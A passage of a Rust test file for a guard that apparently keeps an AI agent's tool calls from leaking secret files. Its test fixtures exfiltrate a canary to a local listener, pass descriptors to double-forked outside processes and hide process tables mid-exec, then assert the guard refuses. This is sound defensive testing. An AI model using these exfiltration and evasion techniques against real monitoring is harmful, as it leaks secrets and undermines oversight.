    let (port, got) = tcp_listener(DEST);
    let path = secret.path.clone();
    let Some(code) = guarded(cfg, move || {
        let (ar, aw) = pipe();
        let (or, ow) = pipe();
        let other = fork_run(|| {
            unsafe {
                libc::close(aw);
                libc::close(ar);
                libc::close(ow);
            }
            let data = read_all(or);
            let out = send_to(DEST, port, &data);
            let _ = std::fs::write(secret_file(&path, "other.txt"), out);
            0
        });
        let reader = fork_run(|| {
            unsafe {
                libc::close(ar);
                libc::close(or);
            }
            match read_file(&path) {
                Ok(k) => {
                    write_all(aw, k.as_bytes());
                    write_all(ow, k.as_bytes());
                    0
                }
                Err(_) => 4,
            }
        });
        unsafe {
            libc::close(aw);
            libc::close(or);
            libc::close(ow);
        }
        let _tool_output = read_all(ar);
        let rc = reap(reader);
        let oc = reap(other);
        // The agent, holding the read end of the tool's output: connects.
        let out = send_to(DEST, port, b"AGENT-LIVE");
        let _ = std::fs::write(secret_file(&path, "agent.txt"), out);
        if rc != Some(0) || oc != Some(0) {
            return 5;
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert_eq!(std::fs::read_to_string(secret.file("agent.txt")).unwrap(), "sent", "the agent itself is never made a holder through a tool's output");
    assert_eq!(std::fs::read_to_string(secret.file("other.txt")).unwrap(), format!("e{}", libc::EACCES), "a later process of the agent's executable is no agent");
    std::thread::sleep(Duration::from_millis(200));
    let seen = String::from_utf8_lossy(&got.lock().unwrap()).to_string();
    assert!(!seen.contains(CANARY), "{seen}");
    assert!(seen.contains("AGENT-LIVE"));
    eprintln!("D2 AGENT PASS");
}

/// The agent's tool-call spawn in flight: the agent starts its tool calls
/// in parallel, and each spawn's child holds a copy of every descriptor of
/// the agent (close-on-exec: the agent's end of the other calls' socket
/// pairs, its connection to the model) until its exec. A reader's raw open
/// that met such a fork made it a receiver of the reader's output, and its
/// copy of the agent's connection to a peer no binding names refused the
/// raw open (2026-10-02, the D7 call-root test, ~1 run in 45 under load).
/// The sweep now gives a fork of the agent that receives only until its
/// exec time to reach it (`guard_flow::FORK_EXEC_WAIT`, 2 s).
///
/// `fork`: the spawn execs 300 ms after the reader starts (the reader is a
/// real `cat`, whose open the guard reaches at once), so the sweep meets it
/// still holding the copies; the reader reads raw. `stuck`: the spawn keeps
/// them until the reader is done, past the wait: a receiver like any other,
/// and the raw open is refused (fail-closed). Ordered by pipes, not by
/// pauses, except the 300 ms that puts the exec inside the sweep's wait.
#[test]
#[ignore]
fn a_fork_of_the_agent_on_its_way_to_exec_is_no_receiver() {
    let _one = serial();
    for (tag, execs) in [("fork", true), ("stuck", false)] {
        let secret = Secret::new(&format!("d2-fork-{tag}"));
        let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
        std::fs::write(
            &secret.policy,
            format!(
                r#"{{"agentExe":"{}","ask":"never","session":"pipe","secrets":[{{"path":"{}","twin":"{}","level":"no-model"}}]}}"#,
                exe.display(),
                secret.path.display(),
                secret.file("twin.txt").display()
            ),
        )
        .unwrap();
        let (arbiter, _labels) = recording_arbiter();
        let cfg = secret_cfg(&secret, arbiter);
        let (port, _got) = tcp_listener(DEST);
        let path = secret.path.clone();
        let Some(code) = guarded(cfg, move || {
            // The agent: a tool's output channel (both ends close-on-exec,
            // as libuv makes them) and a connection to a peer no binding
            // names (its "model"), close-on-exec too.
            let (a, b) = socketpair(libc::SOCK_STREAM);
            let Ok(conn) = tcp_connect(DEST, port) else { return 2 };
            let (started_r, started_w) = pipe();
            let (done_r, done_w) = pipe();
            // The next tool call's spawn, before its exec: it keeps the
            // agent's end `b` and `conn` (it drops the write end `a`, which
            // only the reader should hold open).
            let spawn = fork_run(|| {
                unsafe {
                    libc::close(a);
                    libc::close(started_w);
                    libc::close(done_w);
                }
                if execs {
                    if !read_byte(started_r) {
                        return 3;
                    }
                    unsafe { libc::close(started_r) };
                    std::thread::sleep(Duration::from_millis(300));
                    let sleep = std::ffi::CString::new("/bin/sleep").unwrap();
                    let one = std::ffi::CString::new("1").unwrap();
                    let argv = [sleep.as_ptr(), one.as_ptr(), std::ptr::null()];
                    unsafe { libc::execv(sleep.as_ptr(), argv.as_ptr()) };
                    return 127;
                }
                // Until the agent says the reader is done (EOF counts).
                unsafe { libc::close(started_r) };
                let _ = read_byte(done_r);
                0
            });
            // The tool call: `cat x.txt` with the tool's output as stdout,
            // holding none of the agent's other descriptors.
            let reader = fork_run(|| {
                unsafe {
                    libc::close(b);
                    libc::close(conn);
                    libc::close(started_r);
                    libc::close(done_r);
                    libc::close(done_w);
                    libc::dup2(a, 1);
                }
                // Said, then closed: the reader's tree writes into nothing
                // but the tool's output.
                write_all(started_w, b"s");
                unsafe { libc::close(started_w) };
                let cat = std::ffi::CString::new("/bin/cat").unwrap();
                let file = std::ffi::CString::new(path.to_str().unwrap()).unwrap();
                let argv = [cat.as_ptr(), file.as_ptr(), std::ptr::null()];
                unsafe { libc::execv(cat.as_ptr(), argv.as_ptr()) };
                127
            });
            unsafe {
                libc::close(a);
                libc::close(started_r);
                libc::close(started_w);
                libc::close(done_r);
            }
            let rc = reap(reader);
            unsafe { libc::close(done_w) };
            let out = read_all(b);
            let sc = reap(spawn);
            unsafe {
                libc::close(b);
                libc::close(conn);
            }
            let verdict = if String::from_utf8_lossy(&out).contains(CANARY) { "raw".to_string() } else { format!("refused rc={rc:?}") };
            let _ = std::fs::write(secret_file(&path, "reader.txt"), verdict);
            if sc != Some(0) {
                return 5;
            }
            0
        }) else {
            return;
        };
        assert_eq!(code, Some(0), "{tag}");
        let r = std::fs::read_to_string(secret.file("reader.txt")).unwrap();
        if execs {
            assert_eq!(r, "raw", "a fork of the agent that reached its exec is no receiver: the listed reader reads raw");
        } else {
            assert_eq!(r, "refused rc=Some(1)", "a fork that keeps the agent's descriptors past the wait is a receiver (fail-closed)");
        }
    }
    eprintln!("D2 AGENT FORK PASS");
}

/// The exec'd child of [`an_execd_child_of_the_agents_image_is_judged_at_once`]:
/// a no-op test unless `MANDU_TEST_EXECD_CHILD` names its descriptors
/// (`b,conn,done`). It marks them close-on-exec again (as Codex's helper
/// makes its own pipes) and holds them until `done` reaches EOF.
#[test]
#[ignore]
fn execd_child_of_the_agents_image() {
    let Ok(fds) = std::env::var("MANDU_TEST_EXECD_CHILD") else { return };
    let fds: Vec<RawFd> = fds.split(',').filter_map(|f| f.parse().ok()).collect();
    for f in &fds {
        unsafe { libc::fcntl(*f, libc::F_SETFD, libc::FD_CLOEXEC) };
    }
    let _ = read_byte(fds[2]);
    std::process::exit(0);
}

/// 2026-10-09 (confidentiality-plan-13 §4.5.1): a child of the agent on the
/// agent's own image that has EXEC'D already (Codex runs each command
/// through itself as `codex-linux-sandbox`, which reads its preflight's
/// stderr through its own close-on-exec pipe) is no fork on its way to an
/// exec: the sweep judges it at once, as the receiver it is, instead of
/// waiting the whole `FORK_EXEC_WAIT` (2 s) for an exec that happened. Here
/// the agent's image is this test binary, re-run under another argv; it
/// holds the tool's output channel `b` and the agent's connection to a peer
/// no binding names, both close-on-exec: the reader's raw open is refused
/// (fail-closed, as before), and well before the 2 s.
#[test]
#[ignore]
fn an_execd_child_of_the_agents_image_is_judged_at_once() {
    let _one = serial();
    let secret = Secret::new("d2-execd");
    let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
    std::fs::write(
        &secret.policy,
        format!(
            r#"{{"agentExe":"{}","ask":"never","session":"pipe","secrets":[{{"path":"{}","twin":"{}","level":"no-model"}}]}}"#,
            exe.display(),
            secret.path.display(),
            secret.file("twin.txt").display()
        ),
    )
    .unwrap();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, _got) = tcp_listener(DEST);
    let path = secret.path.clone();
    let Some(code) = guarded(cfg, move || {
        let (a, b) = socketpair(libc::SOCK_STREAM);
        let Ok(conn) = tcp_connect(DEST, port) else { return 2 };
        let (done_r, done_w) = pipe();
        let spawn = fork_run(|| {
            unsafe {
                libc::close(a);
                libc::close(done_w);
                for f in [b, conn, done_r] {
                    libc::fcntl(f, libc::F_SETFD, 0);
                }
            }
            let prog = std::ffi::CString::new(exe.to_str().unwrap()).unwrap();
            let args: Vec<std::ffi::CString> = ["--exact", "execd_child_of_the_agents_image", "--ignored", "--nocapture", "--test-threads=1"]
                .iter()
                .map(|a| std::ffi::CString::new(*a).unwrap())
                .collect();
            let mut argv: Vec<*const libc::c_char> = vec![prog.as_ptr()];
            argv.extend(args.iter().map(|a| a.as_ptr()));
            argv.push(std::ptr::null());
            std::env::set_var("MANDU_TEST_EXECD_CHILD", format!("{b},{conn},{done_r}"));
            unsafe { libc::execv(prog.as_ptr(), argv.as_ptr()) };
            127
        });
        // The child has exec'd (its argv is no longer this process's).
        let mine = std::fs::read("/proc/self/cmdline").unwrap_or_default();
        let end = std::time::Instant::now() + Duration::from_secs(5);
        while std::fs::read(format!("/proc/{spawn}/cmdline")).unwrap_or_default() == mine && std::time::Instant::now() < end {
            std::thread::sleep(Duration::from_millis(5));
        }
        std::thread::sleep(Duration::from_millis(200)); // its harness is up, the descriptors re-marked
        let t0 = std::time::Instant::now();
        let reader = fork_run(|| {
            unsafe {
                libc::close(b);
                libc::close(conn);
                libc::close(done_r);
                libc::close(done_w);
                libc::dup2(a, 1);
            }
            let cat = std::ffi::CString::new("/bin/cat").unwrap();
            let file = std::ffi::CString::new(path.to_str().unwrap()).unwrap();
            let argv = [cat.as_ptr(), file.as_ptr(), std::ptr::null()];
            unsafe { libc::execv(cat.as_ptr(), argv.as_ptr()) };
            127
        });
        unsafe { libc::close(a) };
        let rc = reap(reader);
        let took = t0.elapsed();
        unsafe { libc::close(done_w) };
        let out = read_all(b);
        let _ = reap(spawn);
        unsafe {
            libc::close(b);
            libc::close(conn);
            libc::close(done_r);
        }
        let verdict = if String::from_utf8_lossy(&out).contains(CANARY) { "raw".to_string() } else { format!("refused rc={rc:?}") };
        let _ = std::fs::write(secret_file(&path, "reader.txt"), format!("{verdict} ms={}", took.as_millis()));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let r = std::fs::read_to_string(secret.file("reader.txt")).unwrap();
    eprintln!("execd: {r}");
    let (verdict, ms) = r.rsplit_once(" ms=").unwrap();
    assert_eq!(verdict, "refused rc=Some(1)", "a receiver holding an unbound connection: refused (fail-closed)");
    let ms: u64 = ms.parse().unwrap();
    assert!(ms < 1500, "judged at once, not after the 2 s fork-exec wait ({ms} ms)");
    eprintln!("D2 AGENT EXECD PASS");
}

// ── P0 2b: a pipe or socket pair read OUTSIDE the guard's tree ──────────────

/// A process OUTSIDE the guard's tree holding a pipe's read end or a socket
/// pair's end (`outside_holder`): `got` stops it and takes what it read.
struct Outside {
    stop: PathBuf,
    result: RawFd,
    /// It hid as a process inside its exec does (`outside_holder_hidden`).
    hidden: bool,
}

const OUTSIDE_DONE: &[u8] = b"\0outside-holder-done";

/// `pipe2` with close-on-exec (the outside process does not exec).
fn cloexec_pipe() -> (RawFd, RawFd) {
    let mut fds = [0 as RawFd; 2];
    assert_eq!(unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) }, 0, "pipe2");
    (fds[0], fds[1])
}

fn nonblock(fd: RawFd) {
    unsafe {
        let fl = libc::fcntl(fd, libc::F_GETFL);
        libc::fcntl(fd, libc::F_SETFL, fl | libc::O_NONBLOCK);
    }
}

/// `recvmsg` of one descriptor over `via`; -1 none. `wait`: block (bounded
/// by the socket's receive timeout), else return at once.
fn recv_fd(via: RawFd, wait: bool) -> RawFd {
    let mut buf = [0u8; 8];
    let mut iov = libc::iovec { iov_base: buf.as_mut_ptr() as *mut libc::c_void, iov_len: 8 };
    let mut cbuf = [0u64; 8];
    let mut m: libc::msghdr = unsafe { std::mem::zeroed() };
    m.msg_iov = &mut iov;
    m.msg_iovlen = 1;
    m.msg_control = cbuf.as_mut_ptr() as *mut libc::c_void;
    m.msg_controllen = std::mem::size_of_val(&cbuf) as _;
    if unsafe { libc::recvmsg(via, &mut m, if wait { 0 } else { libc::MSG_DONTWAIT }) } <= 0 {
        return -1;
    }
    let mut fd = -1;
    unsafe {
        let c = libc::CMSG_FIRSTHDR(&m);
        if !c.is_null() && (*c).cmsg_type == libc::SCM_RIGHTS {
            std::ptr::copy_nonoverlapping(libc::CMSG_DATA(c), &mut fd as *mut i32 as *mut u8, 4);
        }
    }
    fd
}

/// `sendmsg` of `fd` (one byte, `SCM_RIGHTS`) over the connected socket
/// `via`, no address: 0, or the errno.
fn pass_fd(via: RawFd, fd: RawFd) -> i32 {
    let mut cbuf = [0u64; 4];
    let mut iov = libc::iovec { iov_base: b"F".as_ptr() as *mut libc::c_void, iov_len: 1 };
    let mut m: libc::msghdr = unsafe { std::mem::zeroed() };
    m.msg_iov = &mut iov;
    m.msg_iovlen = 1;
    m.msg_control = cbuf.as_mut_ptr() as *mut libc::c_void;
    m.msg_controllen = unsafe { libc::CMSG_SPACE(4) } as _;
    unsafe {
        let c = libc::CMSG_FIRSTHDR(&m);
        (*c).cmsg_level = libc::SOL_SOCKET;
        (*c).cmsg_type = libc::SCM_RIGHTS;
        (*c).cmsg_len = libc::CMSG_LEN(4) as _;
        std::ptr::copy_nonoverlapping(&fd as *const i32 as *const u8, libc::CMSG_DATA(c), 4);
    }
    if unsafe { libc::sendmsg(via, &m, 0) } < 0 {
        errno()
    } else {
        0
    }
}

/// `sendmsg` of `data` on the connected socket `fd`, no address: 0, or the
/// errno.
fn sendmsg_bytes(fd: RawFd, data: &[u8]) -> i32 {
    let mut iov = libc::iovec { iov_base: data.as_ptr() as *mut libc::c_void, iov_len: data.len() };
    let mut m: libc::msghdr = unsafe { std::mem::zeroed() };
    m.msg_iov = &mut iov;
    m.msg_iovlen = 1;
    if unsafe { libc::sendmsg(fd, &m, libc::MSG_NOSIGNAL) } < 0 {
        errno()
    } else {
        0
    }
}

/// A process OUTSIDE the guard's tree that is not the guard's own process:
/// forked twice, the middle exiting, so it is no descendant of the test
/// process (the guard's tree is everything below it; as
/// fifo_signal_integration.rs `outside_reader`). It keeps only `hold` (a
/// pipe's read end, a socket pair's end) and drains it; with `recv` it also
/// takes descriptors passed over `hold` and drains them too; until `stop`
/// exists (or 60 s), then writes what it read to its result pipe. Returns
/// once it runs.
fn outside_holder(hold: RawFd, recv: bool, stop: &Path) -> Outside {
    outside_holder_hidden(hold, recv, stop, None)
}

/// `outside_holder`, which with `hide` looks for that long as a process
/// inside its exec does (`hide_as_inside_exec`) before it says it runs.
fn outside_holder_hidden(hold: RawFd, recv: bool, stop: &Path, hide: Option<Duration>) -> Outside {
    let stop = stop.to_path_buf();
    let (ready_r, ready_w) = cloexec_pipe();
    let (result_r, result_w) = cloexec_pipe();
    let mid = unsafe { libc::fork() };
    assert!(mid >= 0);
    if mid == 0 {
        let holder = unsafe { libc::fork() };
        if holder == 0 {
            unsafe { libc::setsid() };
            close_all_but(&[hold, ready_w, result_w]);
            nonblock(hold);
            let mut hidden = hide.and_then(|_| hide_as_inside_exec());
            let unhide_at = std::time::Instant::now() + hide.unwrap_or_default();
            let mut hello = vec![if hidden.is_some() { b'h' } else { b'o' }];
            hello.extend_from_slice(&unsafe { libc::getpid() }.to_ne_bytes());
            unsafe {
                libc::write(ready_w, hello.as_ptr() as *const libc::c_void, hello.len());
                libc::close(ready_w);
            }
            let mut fds = vec![hold];
            let mut out = Vec::new();
            let end = std::time::Instant::now() + Duration::from_secs(60);
            let mut last = false;
            loop {
                if hidden.is_some() && std::time::Instant::now() >= unhide_at {
                    unhide(hidden.take());
                }
                if recv {
                    let f = recv_fd(hold, false);
                    if f >= 0 {
                        nonblock(f);
                        fds.push(f);
                        continue;
                    }
                }
                let mut any = false;
                for fd in &fds {
                    let mut buf = [0u8; 512];
                    let n = unsafe { libc::read(*fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
                    if n > 0 {
                        out.extend_from_slice(&buf[..n as usize]);
                        any = true;
                    }
                }
                if any {
                    continue;
                }
                if last || std::time::Instant::now() >= end {
                    break;
                }
                last = stop.exists();
                std::thread::sleep(Duration::from_millis(10));
            }
            out.extend_from_slice(OUTSIDE_DONE);
            let mut off = 0;
            while off < out.len() {
                let n = unsafe { libc::write(result_w, out[off..].as_ptr() as *const libc::c_void, out.len() - off) };
                if n <= 0 {
                    break;
                }
                off += n as usize;
            }
            unsafe { libc::_exit(0) };
        }
        unsafe { libc::_exit(0) };
    }
    unsafe {
        libc::close(ready_w);
        libc::close(result_w);
    }
    reap(mid);
    let mut hello = Vec::new();
    while hello.len() < 5 {
        // No child of this process: the middle one exited.
        readable_within_tree(ready_r, wait_limit(), "waiting for the outside holder to say it runs");
        let mut b = [0u8; 8];
        let n = unsafe { libc::read(ready_r, b.as_mut_ptr() as *mut libc::c_void, 5 - hello.len()) };
        if n <= 0 {
            break;
        }
        hello.extend_from_slice(&b[..n as usize]);
    }
    unsafe { libc::close(ready_r) };
    assert!(matches!(hello.first(), Some(b'o' | b'h')), "the outside holder runs");
    let hidden = hello.first() == Some(&b'h');
    let pid = i32::from_ne_bytes(hello[1..5].try_into().unwrap());
    let ppid = std::fs::read_to_string(format!("/proc/{pid}/stat")).ok().and_then(|s| s.rsplit_once(") ").and_then(|(_, r)| r.split_whitespace().nth(1).and_then(|p| p.parse::<i32>().ok())));
    assert_ne!(ppid, Some(std::process::id() as i32), "the outside holder is a child of the test process (pid 1 of its namespace, or a subreaper): it is inside the guard's tree; run the test under a shell (scripts/kernel-tests.sh)");
    Outside { stop, result: result_r, hidden }
}

impl Outside {
    /// Stop the holder; what it read. Panics when it did not report to the
    /// end (it died: its silence is no proof that it received nothing).
    fn got(self) -> Vec<u8> {
        let _ = std::fs::write(&self.stop, "");
        let mut all = read_to_end_within(self.result, wait_limit(), "reading the outside holder's report to its end, after its stop file");
        unsafe { libc::close(self.result) };
        assert!(all.ends_with(OUTSIDE_DONE), "the outside holder reported what it read, to the end");
        all.truncate(all.len() - OUTSIDE_DONE.len());
        all
    }
}

/// A tool call that holds `out` and reads the secret: "refused e<errno>"
/// when its raw open is refused, else "raw" after writing the secret into
/// `out` (`write`, which the guard does not trap).
fn read_into(path: &Path, out: RawFd) -> String {
    match read_file(path) {
        Ok(k) => {
            write_all(out, k.as_bytes());
            "raw".into()
        }
        Err(e) => format!("refused e{e}"),
    }
}

/// P0 2b: `reader | <a program outside Mandu>`. The read end of the
/// reader's pipe is held by a process outside the guard's tree (a pipe the
/// launch did not hand in as the human plane): before 2026-10-09 the sweep
/// looked for readers in the tree only, and the outside one received the
/// secret. Now the raw open is refused. Control: a tool call holding a pipe
/// read only inside the tree reads raw (and every tool call here also
/// holds the test's own stdio, the human plane, which may well be a pipe
/// read outside the tree).
#[test]
#[ignore]
fn a_holders_pipe_read_outside_the_tree_refuses_the_raw_open() {
    let _one = serial();
    let secret = Secret::new("p02b-pipe");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (r, w) = pipe();
    let outside = outside_holder(r, false, &secret.file("o.stop"));
    unsafe { libc::close(r) };
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded_keep(cfg, &[w], move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let v = read_into(&path, w);
            let _ = std::fs::write(&out, v);
            0
        });
        unsafe { libc::close(w) };
        let rc = reap(reader);
        let first = std::fs::read_to_string(&out).unwrap_or_default();
        // The control: a pipe read inside the tree only.
        let (ir, iw) = pipe();
        let sink = fork_run(|| {
            unsafe { libc::close(iw) };
            let _ = read_all(ir);
            0
        });
        let started = std::time::Instant::now();
        let ctl = fork_run(|| {
            unsafe { libc::close(ir) };
            let v = read_into(&path, iw);
            let _ = std::fs::write(&out, v);
            0
        });
        unsafe {
            libc::close(ir);
            libc::close(iw);
        }
        let cc = reap(ctl);
        let took = started.elapsed();
        let sc = reap(sink);
        let second = std::fs::read_to_string(&out).unwrap_or_default();
        let _ = std::fs::write(&rp, format!("outside={first} inside={second} rc={rc:?} cc={cc:?} sc={sc:?}"));
        let _ = std::fs::write(secret_file(&path, "took.txt"), format!("{took:?}"));
        0
    }) else {
        let _ = outside.got();
        return;
    };
    let seen = outside.got();
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    eprintln!("p02b pipe: {report}; the control's fork, raw open (sweep included) and exit took {}", std::fs::read_to_string(secret.file("took.txt")).unwrap_or_default());
    assert!(!String::from_utf8_lossy(&seen).contains(CANARY), "THE LEAK: a process outside the guard's tree received the holder's pipe: {report}");
    assert_eq!(report, format!("outside=refused e{} inside=raw rc=Some(0) cc=Some(0) sc=Some(0)", libc::EACCES), "a pipe read outside the tree refuses the raw open; one read only inside goes on");
    eprintln!("P0 2b PIPE PASS");
}

/// P0 2b: the same with a socket pair (Node's child stdio is one): the other
/// end is held outside the guard's tree.
#[test]
#[ignore]
fn a_holders_socket_pair_held_outside_the_tree_refuses_the_raw_open() {
    let _one = serial();
    let secret = Secret::new("p02b-pair");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (a, b) = socketpair(libc::SOCK_STREAM);
    let outside = outside_holder(b, false, &secret.file("o.stop"));
    unsafe { libc::close(b) };
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded_keep(cfg, &[a], move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let v = read_into(&path, a);
            let _ = std::fs::write(&out, v);
            0
        });
        unsafe { libc::close(a) };
        let rc = reap(reader);
        let v = std::fs::read_to_string(&out).unwrap_or_default();
        let _ = std::fs::write(&rp, format!("{v} rc={rc:?}"));
        0
    }) else {
        let _ = outside.got();
        return;
    };
    let seen = outside.got();
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    assert!(!String::from_utf8_lossy(&seen).contains(CANARY), "THE LEAK: a process outside the guard's tree received the holder's socket pair: {report}");
    assert_eq!(report, format!("refused e{} rc=Some(0)", libc::EACCES), "a socket pair held outside the tree refuses the raw open");
    eprintln!("P0 2b SOCKETPAIR PASS");
}

/// P0 2b, after the taint: (1) the agent hands a holder (its tool call,
/// which read the secret) one end of a socket pair whose other end a process
/// outside the tree holds: the pass is refused; (2) the agent hands the
/// other end of the holder's own pair (in the tree at the sweep) to a
/// process outside the tree: the holder's next `sendmsg` on it is refused.
/// Before 2026-10-09 both reached the outside process.
#[test]
#[ignore]
fn a_socket_pair_end_that_leads_outside_after_the_taint_is_refused() {
    let _one = serial();
    let secret = Secret::new("p02b-later");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    // (1) a pair whose end `o1` is outside; (2) the agent's channel `x0` to
    // the outside process, which takes what is passed over it.
    let (o0, o1) = socketpair(libc::SOCK_STREAM);
    let (x0, x1) = socketpair(libc::SOCK_STREAM);
    let outside1 = outside_holder(o1, false, &secret.file("o1.stop"));
    let outside2 = outside_holder(x1, true, &secret.file("o2.stop"));
    unsafe {
        libc::close(o1);
        libc::close(x1);
    }
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded_keep(cfg, &[o0, x0], move || {
        // The agent's channel to its tool call, and the tool call's own pair.
        let (via0, via1) = socketpair(libc::SOCK_STREAM);
        let (h0, h1) = socketpair(libc::SOCK_STREAM);
        let (go_r, go_w) = pipe();
        let (rdy_r, rdy_w) = pipe();
        let hp = path.clone();
        let h = fork_run(move || {
            unsafe {
                libc::close(via0);
                libc::close(h1);
                libc::close(o0);
                libc::close(x0);
                libc::close(go_w);
                libc::close(rdy_r);
            }
            let k = match read_file(&hp) {
                Ok(k) => k,
                Err(e) => return 100 + e,
            };
            write_all(rdy_w, b"r");
            // (1): the end the agent passes, written into at once.
            let tv = libc::timeval { tv_sec: 3, tv_usec: 0 };
            unsafe { libc::setsockopt(via1, libc::SOL_SOCKET, libc::SO_RCVTIMEO, &tv as *const _ as *const libc::c_void, std::mem::size_of_val(&tv) as u32) };
            let fd = recv_fd(via1, true);
            if fd >= 0 {
                write_all(fd, k.as_bytes());
            }
            // (2): once the agent handed the pair's other end outside.
            read_byte(go_r);
            // Its exit code says (50 + the errno, 50 when sent).
            let s = sendmsg_bytes(h0, k.as_bytes());
            let w = std::fs::write(secret_file(&hp, "send.txt"), format!("{s}")).map(|_| 0).unwrap_or_else(|e| e.raw_os_error().unwrap_or(-1));
            eprintln!("p02b later: the holder's sendmsg {s}, its file write {w}");
            50 + s
        });
        unsafe {
            libc::close(via1);
            libc::close(h0);
            libc::close(go_r);
            libc::close(rdy_w);
        }
        if !read_byte(rdy_r) {
            let hc = reap(h);
            let _ = std::fs::write(&rp, format!("the tool call could not read the secret: {hc:?}"));
            return 3;
        }
        let pass1 = pass_fd(via0, o0);
        unsafe { libc::close(o0) };
        let pass2 = pass_fd(x0, h1);
        unsafe { libc::close(h1) };
        write_all(go_w, b"g");
        let hc = reap(h);
        let send = hc.map(|c| (c - 50).to_string()).unwrap_or_else(|| "killed".into());
        let _ = std::fs::write(&rp, format!("pass1={pass1} pass2={pass2} send={send}"));
        0
    }) else {
        let _ = outside1.got();
        let _ = outside2.got();
        return;
    };
    let (seen1, seen2) = (outside1.got(), outside2.got());
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap_or_default();
    eprintln!("p02b later: {report}");
    assert_eq!(code, Some(0), "{report}");
    assert!(!String::from_utf8_lossy(&seen1).contains(CANARY), "THE LEAK: a socket pair end passed to a holder carried the secret outside the tree: {report}");
    assert!(!String::from_utf8_lossy(&seen2).contains(CANARY), "THE LEAK: the holder's sendmsg reached the pair's other end outside the tree: {report}");
    assert_eq!(report, format!("pass1={} pass2=0 send={}", libc::EACCES, libc::EACCES), "the pass to the holder is refused; the agent's own pass out goes on, and the holder's send to it is refused");
    eprintln!("P0 2b LATER PASS");
}

// ── a table the exec it is inside hides (2026-10-17) ────────────────────────
//
// From its image switch until its exec is done, a process's `/proc/<pid>/fd`
// (and `maps`) belongs to root, mode 0500: a guard that is not root in the
// tree's user namespace (a launch's; these tests on a host without
// `scripts/kernel-tests.sh`) read it as "holds nothing", the lenient side of
// every look below. Each fixture hides 500 ms as such a process does
// (`hide_as_inside_exec`), holding what survives an exec; the guard now waits
// for the "exec" to end (`pipe_flow::fd_table_read`) and judges the table it
// ends with. Where the guard is root in the namespace (the CI kernel lane)
// it reads the hidden table at once: the verdict is the same, the window is
// not shown (the tests say which).

const HIDE: Duration = Duration::from_millis(500);

/// A child that runs `hold` (what it keeps across its "exec"), then hides
/// for `hide` and keeps running until `stop` exists: its pid, once hidden,
/// and whether it did hide.
fn hidden_child(stop: PathBuf, hide: Duration, hold: impl FnOnce()) -> (i32, bool) {
    let (ready_r, ready_w) = pipe();
    let child = fork_run(|| {
        unsafe { libc::close(ready_r) };
        hold();
        let argv = hide_as_inside_exec();
        write_all(ready_w, if argv.is_some() { b"h" } else { b"o" });
        unsafe { libc::close(ready_w) };
        std::thread::sleep(hide);
        unhide(argv);
        let end = std::time::Instant::now() + Duration::from_secs(20);
        while !stop.exists() && std::time::Instant::now() < end {
            std::thread::sleep(Duration::from_millis(10));
        }
        0
    });
    unsafe { libc::close(ready_w) };
    let mut b = [0u8; 1];
    let hidden = unsafe { libc::read(ready_r, b.as_mut_ptr() as *mut libc::c_void, 1) } == 1 && b[0] == b'h';
    unsafe { libc::close(ready_r) };
    (child, hidden)
}

/// The SKIP / window line of a hidden-fixture test; false: SKIP.
fn hidden_report(test: &str, hidden: bool, readable: bool) -> bool {
    if !hidden {
        eprintln!("SKIP: {test}: PR_SET_MM_MAP could not empty a command line here");
        return false;
    }
    if readable {
        eprintln!("{test}: the hidden table is readable here (root in the tree's user namespace): the verdict, not the window");
    }
    true
}

/// P0 2b (`pipe_flow::outside_receivers`): a process OUTSIDE the tree holds
/// the read end of the pipe a reader writes the secret into, and is inside
/// an "exec" when the reader opens the secret. Before: unseen, the raw open
/// went on and the secret left the tree. Now: the scan waits for its exec
/// to end, finds it, and refuses the raw open.
#[test]
#[ignore]
fn a_reader_outside_the_tree_caught_inside_its_exec_refuses_the_raw_open() {
    let _one = serial();
    let secret = Secret::new("p02b-inside-exec");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (r, w) = pipe();
    let outside = outside_holder_hidden(r, false, &secret.file("o.stop"), Some(HIDE));
    unsafe { libc::close(r) };
    let hidden = outside.hidden;
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded_keep(cfg, &[w], move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let v = read_into(&path, w);
            let _ = std::fs::write(&out, v);
            0
        });
        unsafe { libc::close(w) };
        let rc = reap(reader);
        let _ = std::fs::write(&rp, format!("outside={} rc={rc:?}", std::fs::read_to_string(&out).unwrap_or_default()));
        0
    }) else {
        let _ = outside.got();
        return;
    };
    let seen = outside.got();
    assert_eq!(code, Some(0));
    if !hidden_report("p02b inside exec", hidden, false) {
        return;
    }
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    assert!(!String::from_utf8_lossy(&seen).contains(CANARY), "THE LEAK: a process outside the tree, caught inside its exec, received the holder's pipe: {report}");
    assert_eq!(report, format!("outside=refused e{} rc=Some(0)", libc::EACCES));
    eprintln!("P0 2b INSIDE-EXEC PASS");
}

/// The taint-time sweep's sockets (`guard_send::socket_fds`): the reader's
/// child holds a connection to an unbound host and is inside an "exec" when
/// the reader opens the secret. Before: its table read as empty, the raw
/// open went on. Now: the sweep waits for its exec to end, finds the
